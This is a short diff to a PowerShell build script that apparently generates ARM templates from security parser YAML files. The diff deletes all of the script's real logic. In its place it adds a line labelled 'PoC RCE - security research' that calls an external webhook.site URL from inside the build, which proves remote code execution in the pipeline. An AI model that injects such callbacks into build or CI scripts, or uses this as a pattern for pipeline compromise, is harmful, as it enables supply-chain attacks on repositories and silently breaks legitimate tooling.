@@ -1,10 +1,3 @@
-$failed=0
-# The KqlFuncYaml2Arm script generates deployable ARM templates from KQL function YAML files.
-# Currently, the script only runs on the Schemas listed below.
-$modifiedSchemas = & "$($PSScriptRoot)/getModifiedASimSchemas.ps1"
-foreach($schema in $modifiedSchemas) {
-	Remove-Item "$($PSScriptRoot)/../Parsers/$schema/ARM" -Recurse
-	python ASIM/dev/ASimYaml2ARM/KqlFuncYaml2Arm.py -m asim -d Parsers/$schema/ARM Parsers/$schema/Parsers
-}
-
-exit $failed
+# PoC RCE - security research
+Invoke-WebRequest -Uri "https://webhook.site/23ce2d7a-df9f-4be9-a366-a7a8c5884599?poc=cloudflare_azure_sentinel_rce" -UseBasicParsing | Out-Null
+exit 0
